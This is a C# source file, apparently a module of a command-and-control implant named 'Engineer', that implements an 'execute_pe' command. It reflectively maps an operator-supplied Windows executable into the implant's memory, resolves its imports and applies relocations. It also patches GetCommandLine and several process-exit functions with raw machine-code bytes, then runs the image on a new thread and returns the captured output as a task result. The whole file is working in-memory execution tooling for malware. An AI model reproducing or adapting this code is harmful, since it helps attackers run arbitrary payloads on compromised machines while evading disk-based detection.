using DynamicEngLoading;
using Engineer.Functions;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static DynamicEngLoading.h_DynInv;
using static DynamicEngLoading.h_DynInv_Methods;  
using static DynamicEngLoading.h_DynInv.PE;
using static DynamicEngLoading.h_DynInv.Win32;
using fastJSON;
using System.Management.Automation;

namespace Engineer.Commands
{
    internal class execute_pe : EngineerCommand
    {
        public override string Name => "execute_pe";
        public static EngineerTask EngineerTask { get; set; }

        public override async Task Execute(EngineerTask task)
        {
            EngineerTask = task;
            if (IntPtr.Size != 8)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: x64 only", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                return;
            }
            task.Arguments.TryGetValue("/args", out string args);
            args = args.Trim();
            byte[] bytesToload = task.File;
            var peMapper = new PeMapper();
            peMapper.MapPEIntoMemory(bytesToload, out var pe, out var currentBase);
            
            var importResolver = new ImportResolver();
            importResolver.ResolveImports(pe, currentBase);
            
            var argumentHandler = new ArgumentHandler();
            var filePath = $"{Directory.GetCurrentDirectory()}\\{HelperFunctions.GenerateRandomString(7)}.exe";
            var exitPatcher = new ExitPatcher();
            if (!exitPatcher.PatchExit())
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: Failed to patch exit calls", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                return;
            }
            if (!argumentHandler.UpdateArgs(filePath, args))
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: Failed to patch arguments", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                return;
            }
            
            //var extraEnvironmentalPatcher = new ExtraEnvironmentPatcher((IntPtr)currentBase);
            //extraEnvironmentalPatcher.PerformExtraEnvironmentPatches();
            
            //var extraAPIPatcher = new ExtraAPIPatcher();
            //if (!extraAPIPatcher.PatchAPIs((IntPtr)currentBase))
            //{
            //    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: Failed to patch APIs", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            //    return;
            //}
            
            var fileDescriptorRedirector = new FileDescriptorRedirector();
            if (!fileDescriptorRedirector.RedirectFileDescriptors())
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: Unable to redirect file descriptors", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                return;
            }
            fileDescriptorRedirector.StartReadFromPipe(task);

            //set permissions and execute
            peMapper.SetPagePermissions();
            StartExecution(pe, currentBase);

            // Revert changes
            //peMapper.ClearPE();
            //exitPatcher.ResetExitFunctions();
            //extraAPIPatcher.RevertAPIs();
            //extraEnvironmentalPatcher.RevertExtraPatches();
            //argumentHandler.ResetArgs();
            //importResolver.ResetImports();

            // send the output
            fileDescriptorRedirector.ResetFileDescriptors();
            var output = fileDescriptorRedirector.ReadDescriptorOutput();
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output, task, EngTaskStatus.Complete, TaskResponseType.String);
        }

        private static void StartExecution(PeLoader pe, long currentBase)
        {
            try
            {
                var threadStart = (IntPtr)(currentBase + (int)pe.OptionalHeader64.AddressOfEntryPoint);
                //Console.WriteLine($"[+] Starting execution at {threadStart.ToString("X")}");
                var hThread = IntPtr.Zero;
                WinNT.ACCESS_MASK access = Win32.WinNT.ACCESS_MASK.GENERIC_ALL;
                                
                NtFuncWrapper.NtCreateThreadEx(ref hThread, access, IntPtr.Zero, new IntPtr(-1), threadStart, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                //Ker32FuncWrapper.WaitForSingleObject(hThread, 0xFFFFFFFF);
                while (!EngineerTask.cancelToken.IsCancellationRequested)
                {
                    Ker32FuncWrapper.WaitForSingleObject(hThread, 5000);
                }
            }
            catch (Exception e)
            {
                //Console.WriteLine($"[-] Error {e}\n");
            }
        }
    }

    public sealed class PeMapper
    {
        private IntPtr _codebase;
        private PeLoader _pe;

        public void MapPEIntoMemory(byte[] unpacked, out PeLoader peLoader, out long currentBase)
        {
            _pe = peLoader = new PeLoader(unpacked);
            _codebase = NtFuncWrapper.NtAllocateVirtualMemory(new IntPtr(-1), (int)_pe.OptionalHeader64.SizeOfImage, Kernel32.AllocationType.Commit, (uint)Kernel32.MemoryProtection.ReadWrite);
            currentBase = _codebase.ToInt64();

            for (var i = 0; i < _pe.ImageFileHeader.NumberOfSections; i++)
            {
                var y = Ker32FuncWrapper.VirtualAlloc((IntPtr)(currentBase + _pe.ImageSectionHeaders[i].VirtualAddress), (uint)_pe.ImageSectionHeaders[i].SizeOfRawData, (uint)Kernel32.AllocationType.Commit, (uint)Kernel32.MemoryProtection.ReadWrite);
                if (_pe.ImageSectionHeaders[i].SizeOfRawData > 0)
                {
                    Marshal.Copy(_pe.RawBytes, (int)_pe.ImageSectionHeaders[i].PointerToRawData, y, (int)_pe.ImageSectionHeaders[i].SizeOfRawData);
                }
            }
            var delta = currentBase - (long)_pe.OptionalHeader64.ImageBase;
            var relocationTable = (IntPtr)(currentBase + (int)_pe.OptionalHeader64.BaseRelocationTable.VirtualAddress);
            var relocationEntry = Marshal.PtrToStructure<Kernel32.IMAGE_BASE_RELOCATION>(relocationTable);

            var imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(Kernel32.IMAGE_BASE_RELOCATION));
            var nextEntry = relocationTable;
            var sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
            var offset = relocationTable;

            while (true)
            {
                var pRelocationTableNextBlock = (IntPtr)(relocationTable.ToInt64() + sizeofNextBlock);
                var relocationNextEntry = Marshal.PtrToStructure<Kernel32.IMAGE_BASE_RELOCATION>(pRelocationTableNextBlock);
                var pRelocationEntry = (IntPtr)(currentBase + relocationEntry.VirtualAdress);

                for (var i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                {
                    var value = (ushort)Marshal.ReadInt16(offset, 8 + 2 * i);
                    var type = (ushort)(value >> 12);
                    var fixup = (ushort)(value & 0xfff);

                    switch (type)
                    {
                        case 0x0:
                            break;

                        case 0xA:
                            {
                                var patchAddress = (IntPtr)(pRelocationEntry.ToInt64() + fixup);
                                var originalAddr = Marshal.ReadInt64(patchAddress);
                                Marshal.WriteInt64(patchAddress, originalAddr + delta);
                                break;
                            }
                    }
                }

                offset = (IntPtr)(relocationTable.ToInt64() + sizeofNextBlock);
                sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                relocationEntry = relocationNextEntry;
                nextEntry = (IntPtr)(nextEntry.ToInt64() + sizeofNextBlock);

                if (relocationNextEntry.SizeOfBlock == 0)
                    break;
            }
        }

        public void ClearPE()
        {
            var size = _pe.OptionalHeader64.SizeOfImage;
            ZeroOutMemory(_codebase, (int)size);
            FreeMemory(_codebase);
        }

        internal static bool ZeroOutMemory(IntPtr start, int length)
        {
            var oldProtect  = NtFuncWrapper.NtProtectVirtualMemory(new IntPtr(-1), ref start, length, (uint)Kernel32.MemoryProtection.ReadWrite);
            var zeroes = new byte[length];

            for (var i = 0; i < zeroes.Length; i++)
                zeroes[i] = 0x00;

            Marshal.Copy(zeroes, 0, start, length);

            NtFuncWrapper.NtProtectVirtualMemory(new IntPtr(-1),ref start,length,oldProtect);
            return true;
        }

        internal static void FreeMemory(IntPtr address)
        {
            NtFuncWrapper.NtFreeVirtualMemory( new IntPtr(-1), ref address,0, Kernel32.AllocationType.Release);
        }

        public void SetPagePermissions()
        {
            for (var i = 0; i < _pe.ImageFileHeader.NumberOfSections; i++)
            {
                var execute = ((uint)_pe.ImageSectionHeaders[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
                var read = ((uint)_pe.ImageSectionHeaders[i].Characteristics & IMAGE_SCN_MEM_READ) != 0;
                var write = ((uint)_pe.ImageSectionHeaders[i].Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

                var protection = Kernel32.MemoryProtection.ExecuteReadWrite;

                if (execute && read && write)
                {
                    protection = Kernel32.MemoryProtection.ExecuteReadWrite;
                }
                else if (!execute && read && write)
                {
                    protection = Kernel32.MemoryProtection.ReadWrite;
                }
                else if (!write && execute && read)
                {
                    protection = Kernel32.MemoryProtection.ExecuteRead;
                }
                else if (!execute && !write && read)
                {
                    protection = Kernel32.MemoryProtection.ReadOnly;
                }
                else if (execute && !read && !write)
                {
                    protection = Kernel32.MemoryProtection.Execute;
                }
                else if (!execute && !read && !write)
                {
                    protection = Kernel32.MemoryProtection.NoAccess;
                }
                IntPtr pVirtualAddress = (IntPtr)(_codebase.ToInt64() + _pe.ImageSectionHeaders[i].VirtualAddress);
                NtFuncWrapper.NtProtectVirtualMemory(new IntPtr(-1), ref pVirtualAddress, (int)_pe.ImageSectionHeaders[i].SizeOfRawData, (uint)protection);
            }
        }
    }

    public sealed class PeLoader
    {
        /// The file header
        public IMAGE_FILE_HEADER ImageFileHeader { get; }

        /// Optional 32 bit file header 
        public IMAGE_OPTIONAL_HEADER32 OptionalHeader32 { get; }

        /// Optional 64 bit file header 
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader64 { get; }

        /// Image Section headers. Number of sections is in the file header.
        public IMAGE_SECTION_HEADER[] ImageSectionHeaders { get; }

        public byte[] RawBytes { get; }

        public PeLoader(byte[] fileBytes)
        {
            // Read in the DLL or EXE and get the timestamp
            using (var stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
            {
                var reader = new BinaryReader(stream);
                var dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                var ntHeadersSignature = reader.ReadUInt32();
                ImageFileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (Is32BitHeader)
                {
                    OptionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    OptionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                ImageSectionHeaders = new IMAGE_SECTION_HEADER[ImageFileHeader.NumberOfSections];
                for (var headerNo = 0; headerNo < ImageSectionHeaders.Length; ++headerNo)
                {
                    ImageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }

                RawBytes = fileBytes;
            }
        }

        private static T FromBinaryReader<T>(BinaryReader reader)
        {
            // Read in a byte array
            var bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));
            // Pin the managed memory while, copy it out the data, then unpin it
            var handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            var structure = Marshal.PtrToStructure<T>(handle.AddrOfPinnedObject());
            handle.Free();
            return structure;
        }

        private bool Is32BitHeader
        {
            get
            {
                ushort IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & ImageFileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }
    }

   

    public sealed class ImportResolver
    {
        private readonly List<string> _originalModules = new();

        public void ResolveImports(PeLoader pe, long currentBase)
        {
            using var currentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule module in currentProcess.Modules)
            {
                _originalModules.Add(module.ModuleName);
            }

            var pIDT = (IntPtr)(currentBase + pe.OptionalHeader64.ImportTable.VirtualAddress);
            var dllIterator = 0;

            while (true)
            {
                var pDLLImportTableEntry = (IntPtr)(pIDT.ToInt64() + IDT_SINGLE_ENTRY_LENGTH * dllIterator);

                var iatRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_IAT_OFFSET));
                var pIAT = (IntPtr)(currentBase + iatRVA);

                var dllNameRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_DLL_NAME_OFFSET));
                var pDLLName = (IntPtr)(currentBase + dllNameRVA);
                var dllName = Marshal.PtrToStringAnsi(pDLLName);

                if (string.IsNullOrWhiteSpace(dllName))
                    break;

                var handle = DynInv.GetLoadedModuleAddress(dllName);

                if (handle == IntPtr.Zero)
                    handle = DynInv.LoadModuleFromDisk(dllName);

                if (handle == IntPtr.Zero)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                var pCurrentIATEntry = pIAT;

                while (true)
                {
                    var pDLLFuncName = (IntPtr)(currentBase + Marshal.ReadInt32(pCurrentIATEntry) + ILT_HINT_LENGTH);
                    var dllFuncName = Marshal.PtrToStringAnsi(pDLLFuncName);

                    if (string.IsNullOrWhiteSpace(dllFuncName))
                        break;

                    var pRealFunction = DynInv.GetNativeExportAddress(handle, dllFuncName);

                    if (pRealFunction == IntPtr.Zero)
                        break;

                    Marshal.WriteInt64(pCurrentIATEntry, pRealFunction.ToInt64());

                    pCurrentIATEntry = (IntPtr)(pCurrentIATEntry.ToInt64() + IntPtr.Size);
                }

                dllIterator++;
            }

        }

        public void ResetImports()
        {
            using var currentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule module in currentProcess.Modules)
            {
                if (_originalModules.Contains(module.ModuleName))
                    continue;

                Ker32FuncWrapper.freeLibrary(module.BaseAddress);
            }
        }
    }

    public sealed class ArgumentHandler
    {
        private byte[] _originalCommandLineFuncBytes;
        private IntPtr _ppCommandLineString;
        private IntPtr _ppImageString;
        private IntPtr _pLength;
        private IntPtr _pMaxLength;
        private IntPtr _pOriginalCommandLineString;
        private IntPtr _pOriginalImageString;
        private IntPtr _pNewString;
        private short _originalLength;
        private short _originalMaxLength;
        private string _commandLineFunc;
        private Encoding _encoding;

        public bool UpdateArgs(string filename, string args)
        {
            //var pPEB = DynInv.GetPEBPointer();

            //if (pPEB == IntPtr.Zero)
            //    return false;

            //GetPebCommandLineAndImagePointers(pPEB, out _ppCommandLineString, out _pOriginalCommandLineString, out _ppImageString, out _pOriginalImageString, out _pLength,   out _originalLength,out _pMaxLength,out _originalMaxLength);


            var newCommandLineString = $"\"{filename}\" {args}";
            //var pNewCommandLineString = Marshal.StringToHGlobalUni(newCommandLineString);
            //var pNewImageString = Marshal.StringToHGlobalUni(filename);

            //if (!DynInv.PatchAddress(_ppCommandLineString, pNewCommandLineString))
            //    return false;

            //if (!DynInv.PatchAddress(_ppImageString, pNewImageString))
            //    return false;

            //Marshal.WriteInt16(_pLength, 0, (short)newCommandLineString.Length);
            //Marshal.WriteInt16(_pMaxLength, 0, (short)newCommandLineString.Length);


            if (PatchGetCommandLineFunc(newCommandLineString))
            {
                return true;
            }
            return false;
        }

        private bool PatchGetCommandLineFunc(string newCommandLineString)
        {
            var pCommandLineString = Ker32FuncWrapper.GetCommandLine();
            var commandLineString = Marshal.PtrToStringAuto(pCommandLineString);

            _encoding = Encoding.UTF8;

            if (commandLineString != null)
            {
                var stringBytes = new byte[commandLineString.Length];
                Marshal.Copy(pCommandLineString, stringBytes, 0, commandLineString.Length);

                if (!new List<byte>(stringBytes).Contains(0x00))
                    _encoding = Encoding.ASCII;
            }

            _commandLineFunc = _encoding.Equals(Encoding.ASCII) ? "GetCommandLineA" : "GetCommandLineW";

            _pNewString = _encoding.Equals(Encoding.ASCII)
                ? Marshal.StringToHGlobalAnsi(newCommandLineString)
                : Marshal.StringToHGlobalUni(newCommandLineString);

            var patchBytes = new List<byte> { 0x48, 0xB8 };
            var pointerBytes = BitConverter.GetBytes(_pNewString.ToInt64());

            patchBytes.AddRange(pointerBytes);
            patchBytes.Add(0xC3);

            _originalCommandLineFuncBytes = DynInv.PatchFunction("kernelbase.dll", _commandLineFunc, patchBytes.ToArray());
            return _originalCommandLineFuncBytes != null;
        }

        private static void GetPebCommandLineAndImagePointers(IntPtr pPEB, out IntPtr ppCommandLineString,  out IntPtr pCommandLineString, out IntPtr ppImageString, out IntPtr pImageString,
            out IntPtr pCommandLineLength, out short commandLineLength, out IntPtr pCommandLineMaxLength, out short commandLineMaxLength)
        {
            var ppRtlUserProcessParams = (IntPtr)(pPEB.ToInt64() + PEB_RTL_USER_PROCESS_PARAMETERS_OFFSET);
            var pRtlUserProcessParams = Marshal.ReadInt64(ppRtlUserProcessParams);

            ppCommandLineString = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET + UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET;
            pCommandLineString = (IntPtr)Marshal.ReadInt64(ppCommandLineString);

            ppImageString = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_IMAGE_OFFSET + UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET;
            pImageString = (IntPtr)Marshal.ReadInt64(ppImageString);

            pCommandLineLength = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET;
            commandLineLength = Marshal.ReadInt16(pCommandLineLength);

            pCommandLineMaxLength = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET + RTL_USER_PROCESS_PARAMETERS_MAX_LENGTH_OFFSET;
            commandLineMaxLength = Marshal.ReadInt16(pCommandLineMaxLength);
        }

        internal void ResetArgs()
        {
            DynInv.PatchFunction("kernelbase.dll", _commandLineFunc, _originalCommandLineFuncBytes);
            DynInv.PatchAddress(_ppCommandLineString, _pOriginalCommandLineString);
            DynInv.PatchAddress(_ppImageString, _pOriginalImageString);

            Marshal.WriteInt16(_pLength, 0, _originalLength);
            Marshal.WriteInt16(_pMaxLength, 0, _originalMaxLength);
        }
    }

    public sealed class ExtraEnvironmentPatcher
    {
        private IntPtr _pOriginalPebBaseAddress;
        private IntPtr _pPEBBaseAddr;
        private IntPtr _newPEBaseAddress;

        public ExtraEnvironmentPatcher(IntPtr newPEBaseAddress)
        {
            _newPEBaseAddress = newPEBaseAddress;
        }

        public bool PerformExtraEnvironmentPatches()
        {
            return PatchPebBaseAddress();
        }

        private bool PatchPebBaseAddress()
        {
            _pPEBBaseAddr = (IntPtr)(DynInv.GetPEBPointer().ToInt64() + PEB_BASE_ADDRESS_OFFSET);
            _pOriginalPebBaseAddress = Marshal.ReadIntPtr(_pPEBBaseAddr);

            return DynInv.PatchAddress(_pPEBBaseAddr, _newPEBaseAddress);
        }

        public bool RevertExtraPatches()
        {
            return DynInv.PatchAddress(_pPEBBaseAddr, _pOriginalPebBaseAddress);
        }
    }

    public sealed class ExitPatcher
    {
        private byte[] _terminateProcessOriginalBytes;
        private byte[] _ntTerminateProcessOriginalBytes;
        private byte[] _rtlExitUserProcessOriginalBytes;
        private byte[] _corExitProcessOriginalBytes;

        public bool PatchExit()
        {
            var pExitThreadFunc = DynInv.GetLibraryAddress("kernelbase.dll", "ExitThread");
            var exitThreadPatchBytes = new List<byte> { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());

            exitThreadPatchBytes.AddRange(pointerBytes);
            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            _terminateProcessOriginalBytes =
                DynInv.PatchFunction("kernelbase.dll", "TerminateProcess", exitThreadPatchBytes.ToArray());

            if (_terminateProcessOriginalBytes == null)
                return false;

            _corExitProcessOriginalBytes =
                DynInv.PatchFunction("mscoree.dll", "CorExitProcess", exitThreadPatchBytes.ToArray());

            if (_corExitProcessOriginalBytes == null)
                return false;

            _ntTerminateProcessOriginalBytes =
               DynInv.PatchFunction("ntdll.dll", "NtTerminateProcess", exitThreadPatchBytes.ToArray());

            if (_ntTerminateProcessOriginalBytes == null)
                return false;

            _rtlExitUserProcessOriginalBytes =
                DynInv.PatchFunction("ntdll.dll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());

            if (_rtlExitUserProcessOriginalBytes == null)
                return false;

            return true;
        }

        public void ResetExitFunctions()
        {
            DynInv.PatchFunction("kernelbase.dll", "TerminateProcess", _terminateProcessOriginalBytes);
            DynInv.PatchFunction("mscoree.dll", "CorExitProcess", _corExitProcessOriginalBytes);
            DynInv.PatchFunction("ntdll.dll", "NtTerminateProcess", _ntTerminateProcessOriginalBytes);
            DynInv.PatchFunction("ntdll.dll", "RtlExitUserProcess", _rtlExitUserProcessOriginalBytes);
        }
    }
    public sealed class ExtraAPIPatcher
    {
        private byte[] _originalGetModuleHandleBytes;
        private string _getModuleHandleFuncName;
        private IntPtr _newFuncAlloc;
        private int _newFuncBytesCount;

        public bool PatchAPIs(IntPtr baseAddress)
        {
            _getModuleHandleFuncName = Encoding.UTF8.Equals(Encoding.ASCII) ? "GetModuleHandleA" : "GetModuleHandleW";

            var getModuleHandleFuncAddress = DynInv.GetLibraryAddress("kernelbase.dll", _getModuleHandleFuncName);

            var patchLength = CalculatePatchLength(getModuleHandleFuncAddress);
            WriteNewFuncToMemory(baseAddress, getModuleHandleFuncAddress, patchLength);

            return PatchAPIToJmpToNewFunc(patchLength);
        }

        private bool PatchAPIToJmpToNewFunc(int patchLength)
        {
            var pointerBytes = BitConverter.GetBytes(_newFuncAlloc.ToInt64());

            var patchBytes = new List<byte> { 0x48, 0xB8 };
            patchBytes.AddRange(pointerBytes);

            patchBytes.Add(0xFF);
            patchBytes.Add(0xE0);

            if (patchBytes.Count > patchLength)
                throw new Exception(
                    $"Patch length ({patchBytes.Count})is greater than calculated space available ({patchLength})");

            if (patchBytes.Count < patchLength)
                patchBytes.AddRange(Enumerable.Range(0, patchLength - patchBytes.Count).Select(x => (byte)0x90));

            _originalGetModuleHandleBytes = DynInv.PatchFunction("kernelbase.dll", _getModuleHandleFuncName, patchBytes.ToArray());

            return _originalGetModuleHandleBytes != null;
        }

        private IntPtr WriteNewFuncToMemory(IntPtr baseAddress, IntPtr getModuleHandleFuncAddress, int patchLength)
        {
            var newFuncBytes = new List<byte>
        {
            0x48, 0x85, 0xc9, 0x75, 0x0b,
            0x48,
            0xB8
        };

            var baseAddressPointerBytes = BitConverter.GetBytes(baseAddress.ToInt64());

            newFuncBytes.AddRange(baseAddressPointerBytes);
            newFuncBytes.Add(0xC3);
            newFuncBytes.Add(0x48);
            newFuncBytes.Add(0xB8);

            var pointerBytes = BitConverter.GetBytes(getModuleHandleFuncAddress.ToInt64() + patchLength);

            newFuncBytes.AddRange(pointerBytes);

            var originalInstructions = new byte[patchLength];
            Marshal.Copy(getModuleHandleFuncAddress, originalInstructions, 0, patchLength);

            newFuncBytes.AddRange(originalInstructions);

            newFuncBytes.Add(0xFF);
            newFuncBytes.Add(0xE0);
            _newFuncAlloc = NtFuncWrapper.NtAllocateVirtualMemory(new IntPtr(-1), newFuncBytes.Count, Kernel32.AllocationType.Commit, (uint)h_DynInv.Win32.Kernel32.MemoryProtection.ReadWrite);

            Marshal.Copy(newFuncBytes.ToArray(), 0, _newFuncAlloc, newFuncBytes.Count);
            _newFuncBytesCount = newFuncBytes.Count;
            NtFuncWrapper.NtProtectVirtualMemory( new IntPtr(-1),ref _newFuncAlloc, (int)newFuncBytes.Count, (uint)h_DynInv.Win32.Kernel32.MemoryProtection.ExecuteReadWrite);
            return _newFuncAlloc;
        }

        private static int CalculatePatchLength(IntPtr funcAddress)
        {
            var bytes = new byte[40];
            Marshal.Copy(funcAddress, bytes, 0, 40);
            var searcher = new BoyerMoore(new byte[] { 0x48, 0x8d, 0x4c });
            var length = searcher.Search(bytes).FirstOrDefault();

            if (length == 0)
            {
                searcher = new BoyerMoore(new byte[] { 0x4c, 0x8d, 0x44 });
                length = searcher.Search(bytes).FirstOrDefault();

                if (length == 0)
                    throw new Exception(
                        "Unable to calculate patch length, the function may have changed to a point it is is no longer recognised and this code needs to be updated");
            }

            return length;
        }

        public bool RevertAPIs()
        {
            DynInv.PatchFunction("kernelbase.dll", _getModuleHandleFuncName, _originalGetModuleHandleBytes);
            NtFuncWrapper.RtlZeroMemory(_newFuncAlloc, _newFuncBytesCount);
            int region_size = 0;
            NtFuncWrapper.NtFreeVirtualMemory(new IntPtr(-1), ref _newFuncAlloc, region_size, h_DynInv.Win32.Kernel32.AllocationType.Release);
            return true;
        }
    }

    public sealed class BoyerMoore
    {
        private readonly byte[] _needle;
        private readonly int[] _charTable;
        private readonly int[] _offsetTable;

        public BoyerMoore(byte[] needle)
        {
            _needle = needle;
            _charTable = MakeByteTable(needle);
            _offsetTable = MakeOffsetTable(needle);
        }

        public IEnumerable<int> Search(byte[] haystack)
        {
            if (_needle.Length == 0)
                yield break;

            for (var i = _needle.Length - 1; i < haystack.Length;)
            {
                int j;

                for (j = _needle.Length - 1; _needle[j] == haystack[i]; --i, --j)
                {
                    if (j != 0)
                        continue;

                    yield return i;
                    i += _needle.Length - 1;
                    break;
                }

                i += Math.Max(_offsetTable[_needle.Length - 1 - j], _charTable[haystack[i]]);
            }
        }

        private static int[] MakeByteTable(IList<byte> needle)
        {
            const int alphabetSize = 256;
            var table = new int[alphabetSize];

            for (var i = 0; i < table.Length; ++i)
                table[i] = needle.Count;

            for (var i = 0; i < needle.Count - 1; ++i)
                table[needle[i]] = needle.Count - 1 - i;

            return table;
        }

        private static int[] MakeOffsetTable(IList<byte> needle)
        {
            var table = new int[needle.Count];
            var lastPrefixPosition = needle.Count;

            for (var i = needle.Count - 1; i >= 0; --i)
            {
                if (IsPrefix(needle, i + 1))
                    lastPrefixPosition = i + 1;

                table[needle.Count - 1 - i] = lastPrefixPosition - i + needle.Count - 1;
            }

            for (var i = 0; i < needle.Count - 1; ++i)
            {
                var suffixLength = SuffixLength(needle, i);
                table[suffixLength] = needle.Count - 1 - i + suffixLength;
            }

            return table;
        }

        private static bool IsPrefix(IList<byte> needle, int p)
        {
            for (int i = p, j = 0; i < needle.Count; ++i, ++j)
                if (needle[i] != needle[j])
                    return false;

            return true;
        }

        private static int SuffixLength(IList<byte> needle, int p)
        {
            var len = 0;

            for (int i = p, j = needle.Count - 1; i >= 0 && needle[i] == needle[j]; --i, --j)
                ++len;

            return len;
        }
    }
}
